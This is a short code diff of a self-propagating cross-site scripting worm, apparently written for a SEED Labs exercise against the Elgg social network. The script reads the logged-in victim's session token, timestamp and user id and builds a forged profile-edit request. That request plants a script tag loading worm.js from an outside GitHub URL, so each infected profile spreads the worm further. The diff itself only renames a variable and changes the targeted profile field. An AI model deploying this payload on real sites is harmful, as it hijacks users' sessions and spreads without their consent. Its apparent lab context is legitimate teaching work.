@@ -1,5 +1,5 @@
-var hackbiji_worm = document.getElementById("self-propagating-worm").innerHTML;
-alert(hackbiji_worm);
+var hackbiji_self_worm = document.getElementById("self-propagating-worm").innerHTML;
+alert(hackbiji_self_worm);
 var user = elgg.session.user.username;
 if(user!='hackbiji'){
     var victim = null;
@@ -23,7 +23,7 @@ if(user!='hackbiji'){
     var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
     content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
     content = content.concat("&name=").concat(user);
-    content = content.concat("&&description=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/worm.js'></script>").concat(sub_script);
+    content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/worm.js'></script>").concat(sub_script);
     content = content.concat("&guid=").concat(elgg.session.user.guid);
 
     Ajax.setRequestHeader("Content-Length",content.length);
